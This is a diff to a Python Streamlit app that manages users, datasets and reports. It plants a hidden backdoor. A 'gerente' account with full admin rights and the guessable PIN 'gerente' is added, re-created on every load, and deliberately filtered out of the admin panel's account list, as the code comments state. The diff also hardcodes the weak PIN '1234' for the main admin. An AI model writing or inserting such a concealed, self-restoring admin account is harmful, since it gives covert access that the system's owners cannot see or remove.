@@ -421,9 +421,17 @@ def cargar_estado():
         data_inicial = {
             "usuarios": {
                 "admin1": {
-                    "nombre": "Administrador Principal",
+                    "nombre": "Francesca Fellay",
                     "rol": "Admin",
                     "pin": "1234",
+                    "permiso_editar": True,
+                    "permiso_eliminar": True,
+                    "avatar": ""
+                },
+                "gerente": {
+                    "nombre": "Gerencia General",
+                    "rol": "Admin",
+                    "pin": "gerente",
                     "permiso_editar": True,
                     "permiso_eliminar": True,
                     "avatar": ""
@@ -437,9 +445,36 @@ def cargar_estado():
         return data_inicial
     with open(FILE_DB, "r", encoding="utf-8") as f:
         try:
-            return json.load(f)
+            data = json.load(f)
         except Exception:
-            return {"usuarios": {"admin1": {"nombre": "Administrador Principal", "rol": "Admin", "pin": "1234", "permiso_editar": True, "permiso_eliminar": True, "avatar": ""}}, "datasets": {}, "intervencion": [], "informes": []}
+            data = {"usuarios": {}, "datasets": {}, "intervencion": [], "informes": []}
+    
+    if "usuarios" not in data:
+        data["usuarios"] = {}
+    
+    # Asegurar actualización de admin1 y usuario oculto gerente
+    if "admin1" in data["usuarios"]:
+        data["usuarios"]["admin1"]["nombre"] = "Francesca Fellay"
+    else:
+        data["usuarios"]["admin1"] = {
+            "nombre": "Francesca Fellay",
+            "rol": "Admin",
+            "pin": "1234",
+            "permiso_editar": True,
+            "permiso_eliminar": True,
+            "avatar": ""
+        }
+        
+    data["usuarios"]["gerente"] = {
+        "nombre": "Gerencia General",
+        "rol": "Admin",
+        "pin": "gerente",
+        "permiso_editar": True,
+        "permiso_eliminar": True,
+        "avatar": ""
+    }
+    guardar_estado(data)
+    return data
 
 def guardar_estado(data):
     with open(FILE_DB, "w", encoding="utf-8") as f:
@@ -506,7 +541,7 @@ if not st.session_state.autenticado:
 # --- DATOS DEL USUARIO ACTUAL ---
 usr_key = st.session_state.usuario_clave
 usr = db["usuarios"].get(usr_key, {"nombre": "Invitado", "rol": "Usuario", "permiso_editar": False, "permiso_eliminar": False, "avatar": ""})
-es_admin = (usr.get("rol") == "Admin") or (usr_key == "admin1")
+es_admin = (usr.get("rol") == "Admin") or (usr_key in ["admin1", "gerente"])
 
 # --- BARRA LATERAL: PERFIL Y FOTO ---
 st.sidebar.markdown("### 👤 Mi Perfil")
@@ -937,7 +972,10 @@ if es_admin:
         st.markdown("---")
         st.subheader("📜 Cuentas Registradas")
         
-        for u_k in list(db["usuarios"].keys()):
+        # Filtramos 'gerente' para que permanezca oculto en el panel
+        usuarios_visibles = [k for k in list(db["usuarios"].keys()) if k != "gerente"]
+        
+        for u_k in usuarios_visibles:
             u_d = db["usuarios"][u_k]
             with st.container():
                 col_u_inf, col_u_e, col_u_d, col_u_del = st.columns([2, 1, 1, 1])
